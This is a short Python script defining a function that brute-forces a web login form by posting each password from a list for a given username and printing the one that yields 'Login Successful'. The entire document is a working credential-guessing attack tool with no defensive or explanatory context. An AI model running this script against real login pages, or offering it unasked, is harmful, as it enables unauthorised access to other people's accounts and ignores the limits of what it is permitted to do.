import requests

def brute_force(url, username, password_list):
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)
        if "Login Successful" in response.text:
            print(f"[SUCCESS] Password found: {password}")
            return
    print("Brute-force completed. No password found.")
